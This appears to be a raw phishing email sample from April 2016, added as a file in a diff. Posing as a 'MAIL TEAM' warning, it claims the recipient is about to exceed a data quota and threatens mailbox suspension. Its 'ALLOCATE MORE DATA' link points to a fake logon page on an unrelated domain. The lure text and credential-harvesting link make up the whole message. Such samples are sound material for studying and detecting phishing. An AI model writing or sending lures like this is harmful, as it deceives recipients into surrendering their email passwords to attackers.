@@ -1,0 +1,84 @@
+Return-Path: dlaviosa@usqualitytransport.com
+Delivered-To: jose@monkey.org
+X-FDA: 71393304066.23.feast97_2aaaf1585fc1a
+X-Spam-Summary: 50,0,0,7f80bb677cbd9959,d41d8cd98f00b204,dlaviosa@usqualitytransport.com,:,RULES_HIT:41:72:355:379:800:962:966:967:969:973:982:983:988:989:1189:1208:1221:1260:1263:1313:1314:1345:1381:1431:1436:1437:1516:1517:1518:1534:1539:1561:1575:1588:1589:1592:1594:1711:1714:1730:1749:1777:1792:2194:2196:2199:2200:2525:2540:2560:2563:2682:2685:2693:2859:2896:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3740:3867:3868:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4385:4641:5007:6261:6653:6684:6688:7809:7903:8599:9025:9388:9416:9871:9873:9979:10004:10400:11480:11658:11914:12043:12295:12517:12519:12776:13025:13199:13229:13235:13439:13846:13898:14181:14721:21080:21325:30022:30026:30054,0,RBL:error,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fp,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0,LFtime:13,LUA_SUMMARY:none
+X-HE-Tag: feast97_2aaaf1585fc1a
+X-Filterd-Recvd-Size: 3032
+Received: from mail.mujicas.com (mail.mujicas.com [162.252.57.43])
+	by imf03.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Mon, 11 Apr 2016 09:01:33 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple;
+	d=usqualitytransport.com; s=mail;
+	h=from:subject:date:message-id:to:mime-version:content-type;
+	bh=niRJoaw9J3TJS93TuIaNqqqTntp5sbP9nn4WpwxLQn4=;
+	b=qshmPUVXe6uVWkSM4GB2CCg+yzNS1zptntcmw25ocfN/xVl98ys33pEYgWHpOWEoaK38DP+75S/4P
+	 DXV9jCsGOxMMSdT2rRckwOGAR6M7gIbNvU8WhOYK7peU517/2g24+gZTdIhy4Iy73ckiL4vbeko91X
+	 HxAA95gvWgcVsnCQj0Qyqi9Isd3sqXeFu5QVPc1NX0VQb67I8q+nBRug9LbZqy2aOO9JBOEEoN9bbr
+	 Bm8xoBxEx3yhix01WFoNSzWFi2z5AVTtO6mK/lzqwBQk+uXggawuIHP4x213W4+upSUyN4ffSNkDA3
+	 TndWOnnPQkacDPzD3pfDswRwTnbeOVg==
+Message-ID: <2202737015-2720@mail.mujicas.com>
+X-Spam-Status: No, hits=0.0 required=7.0
+	tests=AWL: -0.152,BAYES_00: -1.665,DEAR_EMAIL: 0.001,
+	HTML_MESSAGE: 0.001,MISSING_MID: 0.497,URIBL_PH_SURBL: 0.61,
+	TOTAL_SCORE: -0.708,autolearn=no
+X-Spam-Level: 
+X-Footer: dXNxdWFsaXR5dHJhbnNwb3J0LmNvbQ==
+Received: from SERVER2011.wray.local ([75.140.35.118])
+	(authenticated user dlaviosa@usqualitytransport.com)
+	by mail.mujicas.com (Kerio Connect 9.0.0) with ESMTPA
+	for jose@monkey.org;
+	Mon, 11 Apr 2016 04:31:00 -0430
+Content-Type: multipart/alternative; boundary="===============0342616217=="
+MIME-Version: 1.0
+Subject: RE-VALIDATE
+To: jose@monkey.org
+From: "MAIL TEAM" <dlaviosa@usqualitytransport.com>
+Date: Mon, 11 Apr 2016 02:01:00 -0700
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 158
+
+You will not see this in a MIME-aware mail reader.
+--===============0342616217==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+Dear jose@monkey.org =
+
+
+You are about exceeding your free data volume. =
+
+
+Avoid mail subscription suspension,and email retrival malfunction, by follo=
+wing below reference =
+
+
+ALLOCATE MORE DATA TO [jose@monkey.org] =
+
+
+We will not be responsible for any subscription suspension or email retriva=
+l malfunction if after this warning no response from you. =
+
+
+Mail Team=20
+
+--===============0342616217==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY>Dear jose@monkey.org <BR><BR>You are about exc=
+eeding your free data volume. <BR><BR>Avoid mail subscription suspension,an=
+d email retrival malfunction, by following below reference <BR><BR><A href=
+=3D"http://marcocosta.eng.br/image/revalidate/mail.htm?cmd=3DLOB=3DRBGLogon=
+&amp;_pageLabel=3Dpage_logonform&amp;secured_page">ALLOCATE MORE DATA TO [j=
+ose@monkey.org]</A> <BR><BR>We will not be responsible for any subscription=
+ suspension or email retrival malfunction if after this warning no response=
+ from you. <BR><BR>Mail Team <BR></BODY></HTML>
+--===============0342616217==--
+
